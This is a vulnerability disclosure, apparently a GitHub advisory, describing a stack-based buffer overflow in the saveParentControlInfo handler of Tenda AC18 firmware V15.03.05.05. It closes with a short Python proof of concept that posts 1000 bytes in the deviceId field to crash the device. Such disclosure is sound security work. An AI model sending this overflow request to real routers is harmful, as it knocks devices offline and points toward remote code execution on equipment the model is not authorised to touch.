## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The function `saveParentControlInfo` contains a stack-based buffer overflow vulnerability.

![image-20240305111933666](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305111933666.png)

it reads in a user-provided parameter `deviceId`, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer.

![image-20240305112536175](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305112536175.png)

As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

![image-20240305112602204](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305112602204.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000


data = {"deviceId": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305222121032](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305222121032.png)
